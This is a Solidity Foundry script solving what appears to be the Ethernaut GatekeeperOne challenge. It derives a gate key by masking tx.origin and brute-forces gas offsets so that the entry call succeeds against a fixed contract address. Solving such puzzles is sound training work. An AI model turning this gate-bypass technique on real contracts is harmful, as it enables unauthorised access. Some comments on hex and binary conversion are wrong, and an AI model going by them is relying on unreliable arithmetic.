// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {GatekeeperOne} from "src/GatekeeperOne.sol";
import {console} from "forge-std/console.sol";

contract Attack {
    // Input? 0x B1 B2 B3 B4 B5 B6 B7 B8
    // 1 byte = 8 bits

    // Condition #1
    // uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)

    // uint32(uint64(_gateKey)) => 0x B5 B6 B7 B8
    // uint16(uint64(_gateKey)) => 0x B7 B8

    // Condition #2
    // uint32(uint64(_gateKey)) != uint64(_gateKey)
    // 0x 00 00 00 00 B5 B6 B7 B8 != 0x B1 B2 B3 B4 B5 B6 B7 B8

    // Condition #3
    // uint32(uint64(_gateKey)) == uint16(uint160(tx.origin))
    // LHS => => 0x B5 B6 B7 B8
    // uint160 = 20 bytes = length of address on ethereum.
    // uint160(tx.oriigin)= numerical representation of the address
    // uint16(uint160(tx.origin)) => last two bytes of tx.origin
    // 0x B5 B6 B7 B8 == last two bytes of tx.origin

    // R1: last 2 bytes must be same
    // R2: first 4 bytes must not be 00
    // R3: last 4 bytes and last 2 bytes of tx.origin must be same

    function attack(address _target) external {
        // F in hexadecimal = 11 in Binary
        // FF FF FF FF = 1111 1111 1111 1111
        // 0 & 1 => 0
        // 1 & 1 => 1
        bytes8 gateKey = bytes8(uint64(uint160(tx.origin)) & 0xFFFFFFFF0000FFFF);

        // brute-force to check for gas
        // i is the gas used before gateTwo
        for (uint256 i = 0; i < 300; i++) {
            try GatekeeperOne(_target).enter{gas: 81910 + i}(gateKey) {
                break;
            } catch {}
        }
    }
}

contract GatekeeperOneSolution is Script {
    address contractAddress = 0x0491b8cba5071E071D7167ED7099823Fda268C8E;
    GatekeeperOne gateKeeperInstance = GatekeeperOne(contractAddress);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log("entrant before:", gateKeeperInstance.entrant());

        Attack attackInstance = new Attack();
        attackInstance.attack(contractAddress);

        console.log("entrant after:", gateKeeperInstance.entrant());
        vm.stopBroadcast();
    }
}
